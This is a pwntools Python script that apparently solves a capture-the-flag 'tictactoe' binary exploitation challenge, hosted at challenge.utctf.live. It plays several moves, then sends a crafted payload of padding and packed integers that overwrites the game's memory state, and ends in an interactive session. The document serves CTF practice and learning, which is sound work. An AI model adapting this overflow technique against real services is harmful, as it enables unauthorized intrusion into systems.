#!/usr/bin/env python3

from pwn import *

exe = ELF("./tictactoe", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("challenge.utctf.live", 7114)

input()

# p.sendafter(b'Choose x or o: ', b'x')
# p.sendafter(b'spot: ', str(5))
# p.sendafter(b'spot: ', str(3))
# p.sendafter(b'spot: ', str(4))
# payload = str(8) + b'a'*0x28 + p32(0)
# payload = payload.ljust(0x46)
# p.sendafter(b'spot: ', payload)

p.sendline(b'x')
p.sendline(str(5))
p.sendline(str(3))
p.sendline(str(4))
payload = b'8' + p32(1)*10 + p32(0)
payload += p64(0) + p64(0x3f7fe5af0) + p64(0x400000002) + p64(1)
p.sendline(payload)

p.interactive()